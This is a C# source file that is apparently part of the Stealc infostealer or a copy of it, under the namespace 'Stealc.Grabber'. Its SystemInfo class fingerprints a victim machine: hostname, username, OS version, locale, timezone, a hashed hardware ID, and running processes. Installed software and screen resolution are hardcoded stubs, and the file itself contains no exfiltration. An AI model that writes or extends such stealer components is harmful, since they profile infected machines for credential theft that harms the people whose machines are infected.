using System.Security.Cryptography;
using System.Text;

namespace Stealc.Grabber.Grabbers;

public sealed class SystemInfo
{
    public string Hostname { get; }
    public string Username { get; }
    public string OsVersion { get; }
    public string Locale { get; }
    public string Timezone { get; }
    public string Hwid { get; }
    public DateTimeOffset CollectedAt { get; }

    public SystemInfo()
    {
        Hostname = Environment.MachineName;
        Username = Environment.UserName;
        OsVersion = Environment.OSVersion.ToString();
        Locale = System.Globalization.CultureInfo.CurrentCulture.Name;
        Timezone = TimeZoneInfo.Local.StandardName;
        CollectedAt = DateTimeOffset.UtcNow;
        Hwid = GenerateHwid();
    }

    private static string GenerateHwid()
    {
        var material = $"{Environment.MachineName}|{Environment.UserName}|{Environment.ProcessorCount}";
        var hash = SHA256.HashData(Encoding.UTF8.GetBytes(material));
        return Convert.ToHexString(hash[..8]).ToUpperInvariant();
    }

    public string ScreenResolution => "1920x1080";

    public List<string> InstalledSoftware()
    {
        return
        [
            "Google Chrome", "Mozilla Firefox", "Microsoft Edge",
            "Discord", "Steam", "Telegram Desktop",
            "Visual Studio Code", ".NET SDK 10",
        ];
    }

    public List<string> RunningProcesses()
    {
        try
        {
            return System.Diagnostics.Process.GetProcesses()
                .Select(p => p.ProcessName)
                .Distinct()
                .OrderBy(n => n)
                .Take(50)
                .ToList();
        }
        catch
        {
            return ["(access denied)"];
        }
    }
}
